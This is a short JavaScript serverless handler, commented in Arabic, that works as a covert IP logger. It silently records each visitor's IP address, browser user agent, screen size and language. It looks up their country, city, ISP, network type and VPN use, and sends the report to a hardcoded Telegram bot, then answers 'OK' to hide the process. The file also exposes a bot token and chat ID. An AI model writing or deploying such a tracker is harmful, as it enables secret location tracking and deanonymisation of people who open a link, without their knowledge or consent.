export default async function handler(req, res) {
    const { res: screenRes, lang } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const botToken = "8677038270:AAF7pXdGVjJDBUgftzoDP0lnJsJEbNPjhpQ";
    const chatId = "5244299184";

    try {
        // جلب معلومات الشركة والموقع عبر الـ IP
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
        const geo = await geoRes.json();

        // تحديد نوع الجهاز بناءً على بصمة الشاشة والمتصفح
        const isMobile = geo.mobile ? "📱 بيانات هاتف" : "🏠 واي فاي/ثابت";
        const protection = geo.proxy ? "⚠️ يستخدم VPN/Proxy" : "✅ اتصال مباشر";

        const message = `🚨 **تقرير البصمة الرقمية الصامتة** 🚨\n\n` +
                        `🌐 **العنوان (IP):** \`${ip}\`\n` +
                        `📍 **الموقع:** ${geo.country || 'غير معروف'}, ${geo.city || 'غير معروف'}\n` +
                        `🏢 **الشركة (ISP):** ${geo.isp || 'غير معروف'}\n` +
                        `📡 **نوع الشبكة:** ${isMobile}\n` +
                        `🛡️ **الحماية:** ${protection}\n\n` +
                        `🖥️ **دقة الشاشة:** ${screenRes || 'غير متوفرة'}\n` +
                        `🌍 **لغة الجهاز:** ${lang || 'غير متوفرة'}\n\n` +
                        `📱 **تفاصيل المتصفح والجهاز:**\n\`${userAgent}\`\n\n` +
                        `⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}`;

        // إرسال التقرير النهائي لتليجرام
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        });

    } catch (error) {
        console.error("Error sending message:", error);
    }

    // الرد على المتصفح بـ OK لإنهاء العملية صمتاً
    res.status(200).send("OK");
}
